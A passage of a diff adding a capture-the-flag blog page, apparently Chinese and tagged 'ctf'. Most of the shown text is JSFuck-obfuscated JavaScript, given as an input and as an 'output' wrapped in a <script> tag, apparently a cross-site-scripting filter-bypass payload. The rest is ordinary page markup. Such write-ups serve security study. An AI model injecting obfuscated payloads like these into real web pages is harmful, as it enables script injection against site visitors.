[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+!+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()//
+</code></pre>
+<p>output</p>
+<pre><code class="language-javascript">&lt;script&gt;console.log(&quot;&quot;);(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+!+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()//&quot;)&lt;/script&gt;
+
+</code></pre>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://www.yyxyy.xyz/tag/6ggTDlhai/" class="tag">
+                    ctf
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://www.yyxyy.xyz/post/sqlilab/">
+                  <h3 class="post-title">
+                    sqlilab
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+
+  </body>
+</html>
